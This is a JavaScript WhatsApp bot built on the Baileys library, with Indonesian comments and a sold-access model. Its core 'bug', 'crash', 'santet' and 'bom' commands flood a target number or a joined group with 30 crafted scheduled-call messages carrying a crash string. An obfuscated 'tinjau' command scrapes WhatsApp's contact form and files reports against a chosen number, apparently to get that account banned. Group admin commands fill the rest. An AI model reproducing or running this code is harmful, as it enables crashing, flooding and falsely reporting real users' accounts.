/*
    Yt: @LinsBotz
    Ig: @rijalsavior
    wa: +6281911317205
© Lins Official
*/
// Jangan Dihapus Creditnya Sebagai Tanda Ucapan Terima Kasih 😊
require ('./seting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require("fs");
const chalk = require("chalk");
const crypto = require("crypto");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const util = require("util");
const cheerio = require("cheerio");
const { exec, spawn, execSync } = require("child_process")
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./database/color')
const { buglins } = require('./database/buglins')
const akses = JSON.parse(fs.readFileSync('./database/akses.json'))
const { smsg, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat } = require('./database/functions')
module.exports = Linsofc = async (Linsofc, m, chatUpdate, store) => {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const NumberId = await Linsofc.decodeJid(Linsofc.user.id)
const isDeveloper = [NumberId, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isAkses = [NumberId, ...akses].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == NumberId ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const { chats } = m
const marah = { react: { text: "🤔", key: m.key}}
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const qmsg = (quoted.msg || quoted)
const isGroup = m.chat.endsWith('@g.us')
const groupMetadata = m.isGroup ? await Linsofc.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(NumberId) : false
const sender = m.key.fromMe ? (Linsofc.user.id.split(':')[0]+'@s.whatsapp.net' || Linsofc.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isQuotedMsg = (type == 'extendedTextMessage')

if (!Linsofc.public) {
if (!m.key.fromMe) return
}

if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
	
try {
ppuser = await Linsofc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = Linsofc.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = Linsofc.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}
}

const sendContact = (jid, number, name, quoted, mn) => {
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return Linsofc.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

const mentionByTag = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

const createPassword = (size) => {
return crypto.randomBytes(size).toString('hex').slice(sender, size)
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const getRandom = (ext) => {
    return `${Math.floor(Math.random() * 10000)}${ext}`
}

const reply = (teks) => {
Linsofc.sendMessage(m.chat, { text: teks }, { quoted: m })
}


switch (command) {
//▬▭▬▭▬▭▬▭▬[ AWAL ]▬▭▬▭▬▭▬▭▬//
case 'menu':{
let menunya = ` Owner : ${owner}
 Name : ${name}
 Name Botz : ${namebot}
 
 ▭▬▭▬▭▬▭▬▭▬▭▬▭▬
 
-- Menu Bug --
> crash 628xxx
> bug 628xxx
> santet 628xxx
> bom 628xxx

-- Santet grup --
> crashgc Linkgc
> santetgc Linkgc
> buggc Linkgc
> bomgc Linkgc

-- Owner Menu --
> tinjau nomor|teks|email
> Addakses 628xxx
> Delakses 628xxx
> Listakses 628xxx
> owner

-- Admin Menu -- 
> add 628xxx
> kick 628xxx
> linkgc 
> promote 628xxx
> demote 628xxx

▭▬▭▬▭▬▭ ▭
© Lins Official
`
reply(menunya)
}
break

// Bug Menu
case 'crash': case 'bug': case 'santet': case 'bom': {
 if (!isAkses) return reply('Silahkan Membeli Akses Terlebih Dahulu Ke Owner Bot')
  if (!args[0]) return reply(`Example : ${command} 628xxx`)
let target = q+'@s.whatsapp.net'
let jumlah = "30"
reply(`Bug ${command} Berhasil Terkirim Kepada ${target} Jangan Lupa Jeda 3 Menit Yah`)
for (let i = 0; i < jumlah; i++) {
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${buglins}`,
}
}), { userJid: from, quoted : m})
Linsofc.relayMessage(target, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(1)
}
}
break

// Bug Grup
case 'crashgc': case 'buggc': case 'santetgc': case 'bomgc': {
 if (!isAkses) return reply('Silahkan Membeli Akses Terlebih Dahulu Ke Owner Bot')
 if (!args[0]) return reply(`Example : ${command} Linkgrup`)
 reply(`Bug ${command} Berhasil Terkirim Jangan Lupa Jeda 3 Menit Yah`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await Linsofc.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${buglins}`,
}
}), { userJid: from, quoted : m})
Linsofc.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(1)
}
}
break

// Owner Menu
case 'owner':{
sendContact(from, owner, name, m)
}
break
case 'addakses':{
if (!isGroup) return reply('fitur untuk grup')
if (!isDeveloper) return reply('untuk owner')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
yo = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Linsofc.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
akses.push(yo)
fs.writeFileSync('./database/akses.json', JSON.stringify(akses))
addakses = yo+`@s.whatsapp.net`
mentions(`sukses ${command} @${addakses.split('@')[0]}`, [addakses])
}
break

case 'delakses':{
if (!isGroup) return reply('fitur untuk grup')
if (!isDeveloper) return reply('untuk owner')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Linsofc.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
unp = akses.indexOf(ya)
akses.splice(unp, 1)
fs.writeFileSync('./database/akses.json', JSON.stringify(akses))
delakses = ya+`@s.whatsapp.net`
mentions(`sukses ${command} @${delakses.split('@')[0]}`, [delakses])
}
break

case 'listakses':{
if (!isGroup) return reply('fitur untuk grup')
if (!isDeveloper) return reply('untuk owner')
let listakses =`*List Akses Lins Botz*\n\ntotal user : ${akses.length}\n`
var no = 1
for (let x of akses) {
listakses +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listakses +=`Untuk menghapus Akses\nKetik delakses 628xxx/@tag`
reply(listakses)
}
break
case "tinjau":{
const _0x252787 = _0x4a45;
(function (_0x7c4e25, _0x5af026) {
    const _0x43c78f = _0x4a45, _0xb3527 = _0x7c4e25();
    while (!![]) {
        try {
            const _0x31e0a8 = parseInt(_0x43c78f(0x171)) / (-0x1 * -0xe5f + -0xa * 0x157 + -0xf8) * (-parseInt(_0x43c78f(0x135)) / (0x346 * 0x6 + 0xa7 * -0x1 + -0x2b * 0x71)) + -parseInt(_0x43c78f(0x16c)) / (0x56 * 0x2f + -0x23b6 + -0x7 * -0x2d9) + -parseInt(_0x43c78f(0x160)) / (0x1963 + -0x6a3 * 0x1 + -0x16 * 0xda) + parseInt(_0x43c78f(0x17e)) / (0x1585 + 0x1052 + -0x25d2) * (parseInt(_0x43c78f(0x178)) / (0x3 * -0x701 + -0x1921 + 0x2e2a)) + -parseInt(_0x43c78f(0x167)) / (-0xa5e + 0x1 * 0x115 + 0x4 * 0x254) + parseInt(_0x43c78f(0x17f)) / (0x1 * -0x189b + -0x222d * -0x1 + -0x98a) + parseInt(_0x43c78f(0x133)) / (0x1 * 0xc9a + -0x254b + -0x1e * -0xd3);
            if (_0x31e0a8 === _0x5af026)
                break;
            else
                _0xb3527['push'](_0xb3527['shift']());
        } catch (_0x50e283) {
            _0xb3527['push'](_0xb3527['shift']());
        }
    }
}(_0x5c10, 0x7d4cb + 0x13 * 0x9d15 + -0x11 * 0xb639));
const mereply = _0x252787(0x13f) + command + (_0x252787(0x143) + _0x252787(0x141) + _0x252787(0x14e) + ':\x20') + command + (_0x252787(0x14c) + _0x252787(0x17b) + _0x252787(0x14f) + _0x252787(0x166) + _0x252787(0x182) + _0x252787(0x16d) + _0x252787(0x170) + _0x252787(0x15e));
if (!isDeveloper)
    return reply(_0x252787(0x13c) + 'r');
if (!q)
    return reply('' + mereply);
function _0x4a45(_0x1b52af, _0x2ec49b) {
    const _0x50934e = _0x5c10();
    return _0x4a45 = function (_0x3cc681, _0x2df8c6) {
        _0x3cc681 = _0x3cc681 - (0x17f * -0x1a + -0xa * 0x27 + 0x299d);
        let _0x49baa5 = _0x50934e[_0x3cc681];
        return _0x49baa5;
    }, _0x4a45(_0x1b52af, _0x2ec49b);
}
let nomortrget = q[_0x252787(0x17a)]('|')[-0x2d * -0x3d + 0x12 * -0x14 + -0x2d * 0x35], tekstinjau = q[_0x252787(0x17a)]('|')[-0x1 * -0x1140 + 0x1 * -0x61 + -0x10de], emailnya = q[_0x252787(0x17a)]('|')[0x17 * 0x146 + -0x1920 + -0x1 * 0x428];
if (!nomortrget)
    return reply('' + mereply);
if (!tekstinjau)
    return reply('' + mereply);
if (!emailnya)
    return reply('' + mereply);
function _0x5c10() {
    const _0x510a45 = [
        '0.0.0',
        'ct/?subjec',
        'ial@gmail.',
        '40doULZO',
        'platform',
        '=jazoest]',
        'cheerio',
        '__hs',
        'length',
        'w_pkg.2.0.',
        '444cZDhkL',
        'for\x20(;;);',
        'split',
        'ya\x20ingin\x20m',
        '__ccg',
        'onWhatsApp',
        '7690WCNHeo',
        '7074456qnRKgR',
        '=lsd]',
        'ANDROID',
        'nomor\x20saya',
        'join',
        'headers',
        'href',
        '.com/conta',
        'action',
        'p.net',
        't=messenge',
        '.com',
        '17382663FblRzi',
        'https://ww',
        '33692OesJek',
        'val',
        'irm',
        'attr',
        '__a',
        'k\x20ditemuka',
        'replace',
        'untuk\x20owne',
        'axios',
        'INDONESIA',
        'Example\x20:\x20',
        'hatsapp_ww',
        's|email\x0a\x0aP',
        'POST',
        '\x20nomor|tek',
        '19316.BP:w',
        'country_se',
        '@s.whatsap',
        '__req',
        '1006630858',
        'phone_numb',
        'data',
        'req',
        '\x20628xxx|sa',
        '__comment_',
        'enggunaan\x20',
        'engkatifka',
        '__csr',
        'set-cookie',
        'get',
        'lsd',
        'format',
        'find',
        'email_conf',
        'jazoest',
        'UNKNOWN',
        'load',
        'form',
        'email',
        'submit',
        '__user',
        'com',
        'append',
        '648980MErxMz',
        'dpr',
        'your_messa',
        'nomor\x20tida',
        'lector',
        'input[name',
        'n\x20kembali\x20',
        '6420183MzXoVU',
        'w.whatsapp',
        '__rev',
        'parse',
        'step',
        '2076093cErjNd',
        '|linsoffic'
    ];
    _0x5c10 = function () {
        return _0x510a45;
    };
    return _0x5c10();
}
let dia = nomortrget[_0x252787(0x17a)]('|')[0x314 * -0x2 + -0x4a3 * 0x4 + 0x18b4][_0x252787(0x13b)](/[^0-9]/g, '');
var cekap = await Linsofc[_0x252787(0x17d)](dia + (_0x252787(0x146) + _0x252787(0x188)));
if (cekap[_0x252787(0x176)] == -0xa68 + -0x1440 + -0x4 * -0x7aa)
    return reply(_0x252787(0x163) + _0x252787(0x13a) + 'n');
var axioss = require(_0x252787(0x13d));
let ntah = await axioss[_0x252787(0x152)](_0x252787(0x134) + _0x252787(0x168) + _0x252787(0x186) + _0x252787(0x16f) + _0x252787(0x131) + 'r'), cookie = ntah[_0x252787(0x184)][_0x252787(0x151)][_0x252787(0x183)](';\x20');
const cheerio = require(_0x252787(0x174));
let $ = cheerio[_0x252787(0x159)](ntah[_0x252787(0x14a)]), $form = $(_0x252787(0x15a)), url = new URL($form[_0x252787(0x138)](_0x252787(0x187)), _0x252787(0x134) + _0x252787(0x168) + _0x252787(0x132))[_0x252787(0x185)], form = new URLSearchParams();
form[_0x252787(0x15f)](_0x252787(0x157), $form[_0x252787(0x155)](_0x252787(0x165) + _0x252787(0x173))[_0x252787(0x136)]()), form[_0x252787(0x15f)](_0x252787(0x153), $form[_0x252787(0x155)](_0x252787(0x165) + _0x252787(0x180))[_0x252787(0x136)]()), form[_0x252787(0x15f)](_0x252787(0x16b), _0x252787(0x15c)), form[_0x252787(0x15f)](_0x252787(0x145) + _0x252787(0x164), _0x252787(0x13e)), form[_0x252787(0x15f)](_0x252787(0x149) + 'er', '' + dia), form[_0x252787(0x15f)](_0x252787(0x15b), emailnya), form[_0x252787(0x15f)](_0x252787(0x156) + _0x252787(0x137), emailnya), form[_0x252787(0x15f)](_0x252787(0x172), _0x252787(0x181)), form[_0x252787(0x15f)](_0x252787(0x162) + 'ge', '' + tekstinjau), form[_0x252787(0x15f)](_0x252787(0x15d), '0'), form[_0x252787(0x15f)](_0x252787(0x139), '1'), form[_0x252787(0x15f)](_0x252787(0x150), ''), form[_0x252787(0x15f)](_0x252787(0x147), '8'), form[_0x252787(0x15f)](_0x252787(0x175), _0x252787(0x144) + _0x252787(0x140) + _0x252787(0x177) + _0x252787(0x16e)), form[_0x252787(0x15f)](_0x252787(0x161), '1'), form[_0x252787(0x15f)](_0x252787(0x17c), _0x252787(0x158)), form[_0x252787(0x15f)](_0x252787(0x169), _0x252787(0x148)), form[_0x252787(0x15f)](_0x252787(0x14d) + _0x252787(0x14b), '0');
let res = await axioss({
    'url': url,
    'method': _0x252787(0x142),
    'data': form,
    'headers': { 'cookie': cookie }
});
reply(util[_0x252787(0x154)](JSON[_0x252787(0x16a)](res[_0x252787(0x14a)][_0x252787(0x13b)](_0x252787(0x179), ''))));
}
break

// Admin grup
case 'linkgc':{
if (!isGroup) return reply('untuk grup')
if (!isBotAdmins) return reply('jadikan bot admin')
var url = await Linsofc.groupInviteCode(from).catch(() => reply('Maaf terjadi kesalahan'))
url = `Link Grup ${groupName}\n\nhttps://chat.whatsapp.com/`+url
reply(url)
}
break

case 'kick': {
if (!isGroup) return reply('Fitur Khusus Grup')
if (!isBotAdmins) return reply('jadikan bot admin')
if (!isGroupAdmins) return reply('Untuk Admin Grup')
  if (!text) return reply(`${command} Tag@/628xxx`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Linsofc.groupParticipantsUpdate(from, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break


case 'add': {
if (!isGroup) return reply('Fitur Khusus Grup')
if (!isBotAdmins) return reply('jadikan bot admin')
if (!isGroupAdmins) return reply('Untuk Admin Grup')
  if (!text) return reply(`${command} 628xxx`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Linsofc.groupParticipantsUpdate(from, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
  
  
case 'promote': {
if (!isGroup) return reply('Fitur Khusus Grup')
if (!isBotAdmins) return reply('jadikan bot admin')
if (!isGroupAdmins) return reply('Untuk Admin Grup')
  if (!text) return reply(`${command} Tag@/628xxx`)
  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await Linsofc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(mess.succes)).catch((err) => reply(mess.error))
  }
  break
case 'demote': {
  if (!isGroup) return reply('Fitur Khusus Grup')
if (!isBotAdmins) return reply('jadikan bot admin')
if (!isGroupAdmins) return reply('Untuk Admin Grup')
  if (!text) return reply(`${command} Tag@/628xxx`)
  let users = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await Linsofc.groupParticipantsUpdate(msg.chat, [users], 'demote').then((res) => reply(mess.succes)).catch((err) => reply(mess.error))
  }
break

//▬▭▬▭▬▭▬▭▬[ BATAS ]▬▭▬▭▬▭▬▭▬//
default:
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})

/*
    Yt: @LinsBotz
    Ig: @rijalsavior
    wa: +6281911317205
© Lins Official
*/
// Jangan Dihapus Creditnya Sebagai Tanda Ucapan Terima Kasih 😊